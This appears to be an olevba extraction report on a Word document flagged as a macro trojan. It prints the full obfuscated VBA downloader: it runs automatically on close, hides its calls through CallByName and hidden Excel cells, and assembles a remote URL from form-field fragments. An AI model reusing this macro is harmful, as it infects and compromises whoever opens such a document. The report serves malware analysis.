olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-210f12d1282e90aadb532e7e891cbe4f089ef4f3ec0568dc459fb5d546c95eaf
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public gsua, cbbv, zr, hwuqd, urjfz
Sub Document_Close()
txn
End Sub
Sub txn()
On Error Resume Next
Application.DisplayAlerts = False
Err.Number = 0
UserForm2.ComboBox1.ListIndex = 2
Dim hn8u
mj = Application.Options.MatchFuzzyCase
If t6 > 650 Then
tg = Application.Options.DiacriticColorVal
t6 = tg
End If
boj1 = Application.Options.AutoFormatAsYouTypeMatchParentheses
If mj > 984 Then
Application.Activate
mj = mj
End If
Set hn8u = CreateObject(UserForm1.ComboBox1)
hn8u.DisplayAlerts = False
jl4p = Application.Options.MeasurementUnit
If boj1 > 1252 Then
nl = Application.Options.GridDistanceHorizontal
boj1 = nl
End If
qk = "visible"
n7 = Application.Options.DisplayPasteOptions
If jl4p > 1793 Then
b1k = Application.CheckSpelling("b6csv")
jl4p = b6csv
End If
ry = "OnTime"
Dim dt
y4gg = 1
g1m = Application.Options.AutoFormatAsYouTypeAutoLetterWizard
If n7 > 1035 Then
t9 = Application.Options.RevisedLinesColor
n7 = t9
End If
o0 = Application.Options.AutoFormatReplaceHyperlinks
If g1m > 4089 Then
nqx0w = Application.Options.UseDiffDiacColor
g1m = nqx0w
End If
jcata = 1
While y4gg <> 0 And jcata < 3
Set dt = hn8u.Workbooks.Open(FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2)
y4gg = Err.Number
jcata = jcata + 1
Wend
If y4gg <> 0 Then
atgq = CallByName(Application, qk, 2)
If atgq = True Then
Set c277 = CreateObject(UserForm1.ComboBox3)
beks = Application.Options.AllowDragAndDrop
If o0 > 2658 Then
v8 = Application.Options.AutoFormatDeleteAutoSpaces
o0 = v8
End If
c277.Documents.Open ActiveDocument.FullName, ReadOnly:=True
c277.Run "ThisDocument." & "txn"
Else
UserForm1.ComboBox4 = UserForm1.ComboBox4 & "0"
Application.OnTime Now + TimeSerial(0, 0, 20), "ThisDocument." & "txn"
End If
hn8u.Quit
Exit Sub
End If
Dim jfb3
vy = Application.Options.AutoFormatApplyHeadings
If jg > 400 Then
hr2z = Application.Options.PasteMergeLists
jg = hr2z
jg = Application.Options.IMEAutomaticControl
If beks > 4052 Then
pd = Application.Options.AllowDragAndDrop
beks = pd
End If
End If
Set jfb3 = hn8u.sheets(1)
b2 = "'"
l5 = hn8u.sheets(2).Cells(185, 25).Value
cbbv = hn8u.sheets(3).Cells(114, 1).Value
qp = hn8u.sheets(3).Cells(11, 19).Value
ad3p = hn8u.sheets(2).Cells(167, 39).Value
ia = hn8u.sheets(1).Cells(179, 2).Value
mbmwn = hn8u.sheets(3).Cells(158, 15).Value
urjfz = hn8u.sheets(3).Cells(117, 29).Value
vl0 = hn8u.sheets(1).Cells(227, 34).Value
fp7 = jfb3.Cells(137, 8).Value
qr = hn8u.sheets(2).Cells(7, 9).Value
cxep = hn8u.sheets(2).Cells(169, 48).Value
kjbzv = hn8u.sheets(2).Cells(237, 25).Value
v6v3s = hn8u.sheets(3).Cells(69, 30).Value
uwb2b = hn8u.sheets(2).Cells(210, 3).Value
b8vgj = hn8u.sheets(3).Cells(158, 50).Value
th8td = hn8u.sheets(3).Cells(65, 4).Value
rpta = hn8u.sheets(2).Cells(109, 13).Value
nb = hn8u.sheets(2).Cells(224, 15).Value
b10v = hn8u.sheets(1).Cells(108, 16).Value
hgf1x = hn8u.sheets(3).Cells(235, 35).Value
gh = hn8u.sheets(3).Cells(14, 35).Value
mei = hn8u.sheets(3).Cells(194, 9).Value
gsua = hn8u.sheets(3).Cells(124, 6).Value
an = hn8u.sheets(3).Cells(139, 23).Value
yd5d4 = jfb3.Cells(228, 33).Value
uo = hn8u.sheets(2).Cells(204, 28).Value
qvz9z = CallByName(hn8u, qr, 2)
Set bxlw4 = UserForm1.Controls.Add("Forms.ComboBox.1")
bxlw4.Value = l5 & qvz9z & an
Set w670f = UserForm1.Controls.Add("Forms.ComboBox.1")
w670f.Value = mbmwn
CallByName CreateObject(gh), qp, 1, bxlw4, th8td, w670f
Set klpe = CreateObject(nb)
Set sn7xy = CallByName(klpe, kjbzv, 2)
Set v6g = CallByName(sn7xy, ad3p, 1)
Set uo = CallByName(klpe, uo, 2)
Set hwuqd = klpe
Set v6v3s = CallByName(uo, v6v3s, 2)
Set b10v = CallByName(v6v3s, b10v, 2)
Set t6 = CallByName(b10v, ia, 1, vl0)
Set gsua = CallByName(t6, gsua, 2)
cxep = CallByName(gsua, cxep, 2)
CallByName gsua, fp7, 1, 1, cxep
ld = Application.Options.AutoFormatAsYouTypeApplyClosings
If vy > 120 Then
mr = Application.Options.CheckSpellingAsYouType
vy = mr
End If
Set zr = UserForm1.Controls.Add("Forms.ComboBox.1")
zr.Value = hgf1x & b8vgj
UserForm3.ComboBox1 = mei
aw = Application.Options.AutoFormatAsYouTypeReplaceHyperlinks
If ld > 69 Then
hwu7 = Application.Options.InlineConversion
ld = hwu7
End If
zr.Value = rpta
nlt = Application.Options.AutoFormatReplacePlainTextEmphasis
If t8 > 2846 Then
razxv = Application.Options.SmartParaSelection
t8 = razxv
t8 = Application.Options.Pagination
If aw > 2534 Then
gacb = Application.Options.TabIndentKey
aw = gacb
End If
End If
hv7v = Application.Options.DefaultTextEncoding
If job > 403 Then
lmc = Application.Options.DisableFeaturesbyDefault
job = lmc
job = Application.Options.AutoFormatPlainTextWordMail
If nlt > 4630 Then
krw5q = Application.Options.AllowDragAndDrop
nlt = krw5q
End If
End If
UserForm4.ComboBox1 = UserForm3.ComboBox1
UserForm3.ComboBox1 = cxep
klpe = Nothing
dt = Nothing
x2fy2 = Application.Options.MatchFuzzyIterationMark
If ohx > 2740 Then
l594 = Application.Options.GridDistanceVertical
ohx = l594
ohx = Application.Options.AutoFormatAsYouTypeReplaceQuotes
If hv7v > 1803 Then
biq = Application.Options.PasteMergeFromPPT
hv7v = biq
End If
End If
jfb3 = Nothing
sn7xy = Nothing
v6g = Nothing
uo = Nothing
v6v3s = Nothing
wkq92 = Application.Caption
If x2fy2 > 2722 Then
ie = Application.Options.MatchFuzzyPunctuation
x2fy2 = ie
End If
j1mt = Application.Options.EnableMisusedWordsDictionary
If wkq92 > 4573 Then
Application.Activate
wkq92 = wkq92
End If
b10v = Nothing
t6 = Nothing
gsua = Nothing
hwuqd = Nothing
DoEvents
CallByName hn8u, uwb2b, 1
d3m2 = Application.Options.AutoFormatAsYouTypeFormatListItemBeginning
If j1mt > 2101 Then
ejcy = Application.Options.Application
j1mt = ejcy
End If
hn8u = Nothing
DoEvents
CallByName CreateObject(gh), yd5d4, 1, l5 & qvz9z & an
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()

axbg = Application.Options.MapPaperSize

If bdjn > 3353 Then


qn = Application.Options.AutoFormatApplyFirstIndents

bdjn = qn

End If

 
 On Error GoTo ErrorHandler

 uy = UserForm2.Controls.Count - 1
 
 If Len(UserForm1.ComboBox4) > 10 Then
 uy = uy * 2
 End If

 t = ""
 For bdjn = 1 To uy Step 2
 t = t & UserForm2.Controls.Item(bdjn)
 Next

 ComboBox1.AddItem "cf"
 ComboBox1.AddItem "ue84q"
 ComboBox1.AddItem t
 ComboBox1.AddItem "ay"
 
 Exit Sub
 

ID = Application.Options.RevisedPropertiesColor

ErrorHandler:
 

ppw = Application.Options.AutoFormatAsYouTypeReplaceOrdinals

If ID > 1409 Then


zuq4 = Application.Options.IgnoreInternetAndFileAddresses

ID = zuq4

End If

 
 
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.gsua, ActiveDocument.cbbv, VbMethod, ActiveDocument.zr
End Sub

 
-------------------------------------------------------------------------------
VBA MACRO UserForm4.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.hwuqd, ActiveDocument.urjfz, VbMethod, ActiveDocument.zr
End Sub

 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
excel.application">
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5x0wbqe81s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
word.application
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'excel.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'i5x0wbqe81s'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'word.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'http'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'8q'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b's://'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'fbF'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox6'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'heav'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox7'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'q7'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox8'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'enly'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox9'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'aat'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox10'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'gem.'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox11'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'cQ'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox12'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'com/'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox13'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'J1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox14'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'11.p'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox15'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Uv'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox16'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'hp'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox17'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Nba'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|n6?h                |6E363F68                                     |
+----------+--------------------+---------------------------------------------+

